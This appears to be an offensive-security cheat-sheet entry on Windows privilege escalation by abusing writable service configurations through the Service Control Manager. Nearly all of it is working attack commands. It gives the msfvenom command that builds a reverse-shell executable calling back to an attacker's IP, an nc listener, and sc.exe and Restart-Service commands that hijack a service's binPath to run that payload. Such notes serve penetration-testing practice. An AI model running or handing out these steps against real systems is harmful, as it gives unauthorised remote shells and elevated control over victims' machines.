## Service Permission with Service Control Manager

### Steps

#### Recon / Enumeration

If there are permissions that are allowed the following on a service:

```
Permissions       : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl, GenericWrite, GenericRead
```

The service is vuln to this method.

#### Exploitation

Generate an reverse shell executable listening to your ip and port:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> lport=<port> -a x64 --platform windows -f exe -o exploit.exe
```

Deliver this payload to an directory you can write to like:

```
C:\Temp
C:\Program Data\
C:\Users\<username>\Downloads,Desktop,etc
```

start the listening port on your attacker machine:
```
nc -lvnp <port>
```

add the executable path to the scm with following command to the victim machine:

```
sc.exe config $serviceName binPath= "C:/<path/to/your/revshell.exe>"
Restart-Service -name <servicename>
```





